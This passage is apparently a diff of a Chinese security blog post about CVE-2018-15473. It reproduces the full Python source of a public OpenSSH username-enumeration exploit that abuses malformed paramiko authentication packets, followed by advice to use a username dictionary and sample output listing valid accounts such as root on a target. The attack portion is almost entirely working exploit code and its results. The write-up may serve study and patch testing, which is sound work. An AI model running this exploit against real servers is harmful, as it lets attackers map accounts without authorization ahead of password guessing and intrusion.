class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(exportList(results))</span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># no usernames passed in</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] No usernames provided to check&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
+<span class="token comment"># python2 exp.py --port SSH端口 --userList 用户名字典 IP</span>
+<span class="token comment">###########################################################################</span>
+<span class="token comment">#                ____                    _____ _____ _    _               #</span>
+<span class="token comment">#               / __ \                  / ____/ ____| |  | |              #</span>
+<span class="token comment">#              | |  | |_ __   ___ _ __ | (___| (___ | |__| |              #</span>
+<span class="token comment">#              | |  | | '_ \ / _ \ '_ \ \___ \\___ \|  __  |              #</span>
+<span class="token comment">#              | |__| | |_) |  __/ | | |____) |___) | |  | |              #</span>
+<span class="token comment">#               \____/| .__/ \___|_| |_|_____/_____/|_|  |_|              #</span>
+<span class="token comment">#                     | |               Username Enumeration              #</span>
+<span class="token comment">#                     |_|                                                 #</span>
+<span class="token comment">#                                                                         #</span>
+<span class="token comment">###########################################################################</span>
+<span class="token comment"># Exploit: OpenSSH Username Enumeration Exploit (CVE-2018-15473)          #</span>
+<span class="token comment"># Vulnerability: CVE-2018-15473                                           #</span>
+<span class="token comment"># Affected Versions: OpenSSH version &lt; 7.7                                #</span>
+<span class="token comment"># Author: Justin Gardner, Penetration Tester @ SynerComm AssureIT         #</span>
+<span class="token comment"># Github: https://github.com/Rhynorater/CVE-2018-15473-Exploit            #</span>
+<span class="token comment"># Email: Justin.Gardner@SynerComm.com                                     #</span>
+<span class="token comment"># Date: August 20, 2018                                                   #</span>
+<span class="token comment">###########################################################################</span>
+
+<span class="token keyword">import</span> argparse
+<span class="token keyword">import</span> logging
+<span class="token keyword">import</span> paramiko
+<span class="token keyword">import</span> multiprocessing
+<span class="token keyword">import</span> socket
+<span class="token keyword">import</span> string
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> json
+<span class="token keyword">from</span> random <span class="token keyword">import</span> randint <span class="token keyword">as</span> rand
+<span class="token keyword">from</span> random <span class="token keyword">import</span> choice <span class="token keyword">as</span> choice
+<span class="token comment"># store function we will overwrite to malform the packet</span>
+old_parse_service_accept <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>auth_handler<span class="token punctuation">.</span>AuthHandler<span class="token punctuation">.</span>_handler_table<span class="token punctuation">[</span>paramiko<span class="token punctuation">.</span>common<span class="token punctuation">.</span>MSG_SERVICE_ACCEPT<span class="token punctuation">]</span>
+
+<span class="token comment"># list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the target</span>
+<span class="token comment"># with these 3 random usernames (there is an almost 0 possibility that they can be real ones)</span>
+random_username_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+<span class="token comment"># populate the list</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    user <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>choice<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    random_username_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user<span class="token punctuation">)</span>
+
+<span class="token comment"># create custom exception</span>
+<span class="token keyword">class</span> <span class="token class-name">BadUsername</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">pass</span>
+
+<span class="token comment"># create malicious "add_boolean" function to malform packet</span>
+<span class="token keyword">def</span> <span class="token function">add_boolean</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">pass</span>
+
+<span class="token comment"># create function to call when username was invalid</span>
+<span class="token keyword">def</span> <span class="token function">call_error</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">raise</span> BadUsername<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment"># create the malicious function to overwrite MSG_SERVICE_ACCEPT handler</span>
+<span class="token keyword">def</span> <span class="token function">malform_packet</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    old_add_boolean <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>message<span class="token punctuation">.</span>Message<span class="token punctuation">.</span>add_boolean
+    paramiko<span class="token punctuation">.</span>message<span class="token punctuation">.</span>Message<span class="token punctuation">.</span>add_boolean <span class="token operator">=</span> add_boolean
+    result  <span class="token operator">=</span> old_parse_service_accept<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
+    <span class="token comment">#return old add_boolean function so start_client will work again</span>
+    paramiko<span class="token punctuation">.</span>message<span class="token punctuation">.</span>Message<span class="token punctuation">.</span>add_boolean <span class="token operator">=</span> old_add_boolean
+    <span class="token keyword">return</span> result
+
+<span class="token comment"># create function to perform authentication with malformed packet and desired username</span>
+<span class="token keyword">def</span> <span class="token function">checkUsername</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> tried<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>hostname<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token comment"># instantiate transport</span>
+    transport <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>Transport<span class="token punctuation">(</span>sock<span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        transport<span class="token punctuation">.</span>start_client<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> paramiko<span class="token punctuation">.</span>ssh_exception<span class="token punctuation">.</span>SSHException<span class="token punctuation">:</span>
+        <span class="token comment"># server was likely flooded, retry up to 3 times</span>
+        transport<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> tried <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>
+            tried <span class="token operator">+=</span> <span class="token number">1</span>
+            <span class="token keyword">return</span> checkUsername<span class="token punctuation">(</span>username<span class="token punctuation">,</span> tried<span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] Failed to negotiate SSH transport'</span><span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        transport<span class="token punctuation">.</span>auth_publickey<span class="token punctuation">(</span>username<span class="token punctuation">,</span> paramiko<span class="token punctuation">.</span>RSAKey<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> BadUsername<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> paramiko<span class="token punctuation">.</span>ssh_exception<span class="token punctuation">.</span>AuthenticationException<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
+    <span class="token comment">#Successful auth(?)</span>
+    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"There was an error. Is this the correct version of OpenSSH?"</span><span class="token punctuation">)</span>
+
+<span class="token comment"># function to test target system using the randomly generated usernames</span>
+<span class="token keyword">def</span> <span class="token function">checkVulnerable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    vulnerable <span class="token operator">=</span> <span class="token boolean">True</span>
+    <span class="token keyword">for</span> user <span class="token keyword">in</span> random_username_list<span class="token punctuation">:</span>
+        result <span class="token operator">=</span> checkUsername<span class="token punctuation">(</span>user<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+            vulnerable <span class="token operator">=</span> <span class="token boolean">False</span>
+    <span class="token keyword">return</span> vulnerable
+
+<span class="token keyword">def</span> <span class="token function">exportJSON</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Valid"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"Invalid"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>
+    <span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">and</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">[</span><span class="token string">'Valid'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+            data<span class="token punctuation">[</span><span class="token string">'Valid'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token keyword">elif</span> <span class="token keyword">not</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">and</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">[</span><span class="token string">'Invalid'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+            data<span class="token punctuation">[</span><span class="token string">'Invalid'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">exportCSV</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    final <span class="token operator">=</span> <span class="token string">"Username, Valid\n"</span>
+    <span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span>
+        final <span class="token operator">+=</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">", "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span>
+    <span class="token keyword">return</span> final
+
+<span class="token keyword">def</span> <span class="token function">exportList</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    final <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+            final<span class="token operator">+=</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" is a valid user!\n"</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            final<span class="token operator">+=</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" is not a valid user!\n"</span>
+    <span class="token keyword">return</span> final
+
+<span class="token comment"># assign functions to respective handlers</span>
+paramiko<span class="token punctuation">.</span>auth_handler<span class="token punctuation">.</span>AuthHandler<span class="token punctuation">.</span>_handler_table<span class="token punctuation">[</span>paramiko<span class="token punctuation">.</span>common<span class="token punctuation">.</span>MSG_SERVICE_ACCEPT<span class="token punctuation">]</span> <span class="token operator">=</span> malform_packet
+paramiko<span class="token punctuation">.</span>auth_handler<span class="token punctuation">.</span>AuthHandler<span class="token punctuation">.</span>_handler_table<span class="token punctuation">[</span>paramiko<span class="token punctuation">.</span>common<span class="token punctuation">.</span>MSG_USERAUTH_FAILURE<span class="token punctuation">]</span> <span class="token operator">=</span> call_error
+
+<span class="token comment"># get rid of paramiko logging</span>
+logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">'paramiko.transport'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>NullHandler<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+arg_parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
+arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'hostname'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The target hostname or ip address"</span><span class="token punctuation">)</span>
+arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--port'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The target port"</span><span class="token punctuation">)</span>
+arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--threads'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The number of threads to be used"</span><span class="token punctuation">)</span>
+arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--outputFile'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The output file location"</span><span class="token punctuation">)</span>
+arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--outputFormat'</span><span class="token punctuation">,</span> choices<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'list'</span><span class="token punctuation">,</span> <span class="token string">'json'</span><span class="token punctuation">,</span> <span class="token string">'csv'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'list'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The output file location"</span><span class="token punctuation">)</span>
+group <span class="token operator">=</span> arg_parser<span class="token punctuation">.</span>add_mutually_exclusive_group<span class="token punctuation">(</span>required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--username'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The single username to validate"</span><span class="token punctuation">)</span>
+group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--userList'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The list of usernames (one per line) to enumerate through"</span><span class="token punctuation">)</span>
+args <span class="token operator">=</span> arg_parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>hostname<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] Connecting to host failed. Please check the specified host and port.'</span><span class="token punctuation">)</span>
+        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># first we run the function to check if host is vulnerable to this CVE</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> checkVulnerable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># most probably the target host is either patched or running a version not affected by this CVE</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Target host most probably is not vulnerable or already patched, exiting..."</span><span class="token punctuation">)</span>
+        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token keyword">elif</span> args<span class="token punctuation">.</span>username<span class="token punctuation">:</span> <span class="token comment">#single username passed in</span>
+        result <span class="token operator">=</span> checkUsername<span class="token punctuation">(</span>args<span class="token punctuation">.</span>username<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" is a valid user!"</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" is not a valid user!"</span><span class="token punctuation">)</span>
+    <span class="token keyword">elif</span> args<span class="token punctuation">.</span>userList<span class="token punctuation">:</span> <span class="token comment">#username list passed in</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>userList<span class="token punctuation">)</span>
+        <span class="token keyword">except</span> IOError<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] File doesn't exist or is unreadable."</span><span class="token punctuation">)</span>
+            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+        usernames <span class="token operator">=</span> <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>strip<span class="token punctuation">,</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token comment"># map usernames to their respective threads</span>
+        pool <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Pool<span class="token punctuation">(</span>args<span class="token punctuation">.</span>threads<span class="token punctuation">)</span>
+        results <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token builtin">map</span><span class="token punctuation">(</span>checkUsername<span class="token punctuation">,</span> usernames<span class="token punctuation">)</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFile<span class="token punctuation">:</span>
+                outputFile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>outputFile<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>
+        <span class="token keyword">except</span> IOError<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Cannot write to outputFile."</span><span class="token punctuation">)</span>
+            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFormat<span class="token operator">==</span><span class="token string">'json'</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFile<span class="token punctuation">:</span>
+                outputFile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>exportJSON<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>
+                outputFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Results successfully written to "</span> <span class="token operator">+</span> args<span class="token punctuation">.</span>outputFile <span class="token operator">+</span> <span class="token string">" in JSON form."</span><span class="token punctuation">)</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span>exportJSON<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">elif</span> args<span class="token punctuation">.</span>outputFormat<span class="token operator">==</span><span class="token string">'csv'</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFile<span class="token punctuation">:</span>
+                outputFile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>exportCSV<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>
+                outputFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Results successfully written to "</span> <span class="token operator">+</span> args<span class="token punctuation">.</span>outputFile <span class="token operator">+</span> <span class="token string">" in CSV form."</span><span class="token punctuation">)</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span>exportCSV<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFile<span class="token punctuation">:</span>
+                outputFile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>exportList<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>
+                outputFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Results successfully written to "</span> <span class="token operator">+</span> args<span class="token punctuation">.</span>outputFile <span class="token operator">+</span> <span class="token string">" in List form."</span><span class="token punctuation">)</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span>exportList<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token comment"># no usernames passed in</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] No usernames provided to check"</span><span class="token punctuation">)</span>
+        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>此处我们还需要一个用户名字典，可以自行构造，也可以用github上面一个开源项目<a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/">SecLists</a>，节约时间我们自行构造一个简短list，最终测试结果如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">admin is not a valid user!</span><br><span class="line">bin is a valid user!</span><br><span class="line">sys is a valid user!</span><br><span class="line">sync is a valid user!</span><br><span class="line">games is a valid user!</span><br><span class="line">man is a valid user!</span><br><span class="line">lp is a valid user!</span><br><span class="line">111 is not a valid user!</span><br><span class="line">1243 is not a valid user!</span><br><span class="line">sahdsa is not a valid user!</span><br><span class="line">jalba is not a valid user!</span><br><span class="line">dsa is not a valid user!</span><br><span class="line">fe is not a valid user!</span><br><span class="line">qf is not a valid user!</span><br><span class="line">ds is not a valid user!</span><br><span class="line">vc is not a valid user!</span><br><span class="line">dsshg is not a valid user!</span><br><span class="line">rsa is not a valid user!</span><br><span class="line">grdfsbvfgd is not a valid user!</span><br><span class="line">sb is not a valid user!</span><br><span class="line">fgd is not a valid user!</span><br><span class="line">s is not a valid user!</span><br><span class="line">bgfd is not a valid user!</span><br><span class="line">s is not a valid user!</span><br><span class="line">g is not a valid user!</span><br><span class="line">fds is not a valid user!</span><br><span class="line">g is not a valid user!</span><br><span class="line">fd is not a valid user!</span><br><span class="line">sgf is not a valid user!</span><br><span class="line">ds is not a valid user!</span><br><span class="line">g is not a valid user!</span><br><span class="line">fdsh is not a valid user!</span><br><span class="line">tr is not a valid user!</span><br><span class="line">wnbyrsbf is not a valid user!</span><br><span class="line">dgs is not a valid user!</span><br><span class="line">root is a valid user!</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">admin is not a valid user!
+bin is a valid user!
+sys is a valid user!
+sync is a valid user!
+games is a valid user!
+man is a valid user!
+lp is a valid user!
+111 is not a valid user!
+1243 is not a valid user!
+sahdsa is not a valid user!
+jalba is not a valid user!
